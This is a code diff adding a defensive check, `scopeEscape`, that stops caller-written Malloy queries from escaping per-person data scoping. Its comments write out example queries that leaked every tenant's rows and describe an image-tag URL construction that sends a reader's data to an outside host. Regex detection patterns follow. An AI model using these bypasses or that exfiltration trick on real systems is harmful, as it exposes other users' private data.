@@ -87,6 +87,84 @@ export function unreferencedGivens(
   return [...required].sort();
 }
 
+/**
+ * Why caller-written Malloy may not run against scoped data, or null if it may.
+ *
+ * `unreferencedGivens` asks whether the compiled query references the scoping
+ * given ANYWHERE. That is the right test for a query over a source the MODEL
+ * defined, and no test at all once the caller can put the reference there
+ * themselves. Both of these were run against the real engine and returned every
+ * tenant's rows with the gate on:
+ *
+ *   run: raw -> { select: who, _ is $MALLOYYO_EMAIL }
+ *     — an unfiltered source, plus a column that merely mentions the given;
+ *
+ *   run: mine extend { join_cross: r is raw } -> { select: r.who }
+ *   run: raw extend { join_cross: m is mine } -> { select: who, m.who }
+ *     — the reference rides in on the scoped source of a join the CALLER
+ *       wrote, in either direction, without the given being named at all.
+ *
+ * So on scoped data, text a caller wrote may do neither: it may not name a
+ * reserved given, and it may not define a join. With those two closed, the only
+ * way a query references the given is through what the model itself defines on
+ * the source it runs over — which is what the gate was always assuming. A join
+ * between sources is the model author's to write, because it is a statement
+ * about which rows belong together; a caller who needs one asks for it in the
+ * model.
+ *
+ * LEXICAL, AND DELIBERATELY SO. It runs on the raw text, comments and string
+ * literals included, with no attempt to skip either: a scanner that skips
+ * "comments" can be handed `'//'` in a string to hide what follows. The price is
+ * a refusal for text that only mentions these in a comment, which says so and
+ * costs a retry. Case-insensitive for the same fail-closed reason.
+ *
+ * A THIRD THING, for the same audience: the `# image` and `# link` render tags.
+ * They are not a way past the gate — they are a way to carry what the gate
+ * correctly returned to somebody else. A draft dashboard or a shared query is
+ * written by one member and RUN AS whoever opens it, so on scoped data its
+ * rows are the reader's, not the author's; a column tagged `# image` whose
+ * value is `concat('https://elsewhere/?d=', …)` has the reader's browser send
+ * those rows to the author, with no click. A tag on a field in the published
+ * model is the publisher's to write, and is untouched.
+ *
+ * Applies to every piece of text someone other than the model's publisher
+ * wrote: an ad-hoc query, a dashboard panel's inline Malloy, a run-expression,
+ * and a draft dashboard's own `.malloy` file.
+ */
+export function scopeEscape(text: string, required: RequiredGivens): string | null {
+  if (required.length === 0) return null;
+  if (RESERVED_REFERENCE.test(text)) {
+    return (
+      `this data is scoped per person, and a query here may not reference $${RESERVED_GIVEN_PREFIX}… itself ` +
+      '(not even in a comment). The scope comes from the source the model defines; query that source as it is.'
+    );
+  }
+  if (URL_RENDER_TAG.test(text) || ESCAPED_ANNOTATION.test(text)) {
+    return (
+      'this data is scoped per person, and a query or draft here may not use the "# image" or "# link" render tags ' +
+      '(or a backslash in any "#" tag): what it returns belongs to whoever opens it, and those tags make their ' +
+      'browser load an address built from it. Put the tag on the field in the model.'
+    );
+  }
+  if (CALLER_JOIN.test(text)) {
+    return (
+      'this data is scoped per person, and a query here may not define a join (join_one / join_many / join_cross): ' +
+      'joining a scoped source to an unscoped one reads rows the scope hides. Joins on scoped data belong in the model.'
+    );
+  }
+  return null;
+}
+
+/** A dollar sign, then — through any whitespace or backquotes — a reserved name. */
+const RESERVED_REFERENCE = new RegExp('[$][\\s\\u0060]*' + RESERVED_GIVEN_PREFIX, 'i');
+const CALLER_JOIN = /\bjoin_(one|many|cross)\b/i;
+/** An annotation (`#` to end of line, wherever on the line it starts) naming
+    one of the two render tags whose value becomes a URL the browser loads. */
+const URL_RENDER_TAG = /#[^\n]*\b(image|link)\b/i;
+/** …or carrying an escape, which is how a tag name would be spelled to get
+    past the line above. No ordinary tag needs one. */
+const ESCAPED_ANNOTATION = /#[^\n]*\\/;
+
 /** What to tell a caller whose query skipped one. */
 export function unreferencedGivensMessage(missing: string[]): string {
   const many = missing.length > 1;
